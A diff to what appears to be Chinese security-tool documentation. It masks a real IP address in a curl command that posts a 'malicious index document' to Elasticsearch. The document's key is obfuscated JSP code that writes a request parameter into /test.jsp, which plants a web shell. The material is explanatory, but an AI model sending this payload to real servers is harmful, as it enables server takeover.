@@ -66,7 +66,7 @@ Yakit正在努力编写~
 首先创建一个恶意索引文档：
 
 ```go
-curl -XPOST http://185.238.248.179:9200/yz.jsp/yz.jsp/1 -d'
+curl -XPOST http://xx.xxx.xx.xx/yz.jsp/yz.jsp/1 -d'
 {"<%new java.io.RandomAccessFile(application.getRealPath(new String(new byte[]{47,116,101,115,116,46,106,115,112})),new String(new byte[]{114,119})).write(request.getParameter(new String(new byte[]{102})).getBytes());%>":"test"}
 '
 ```
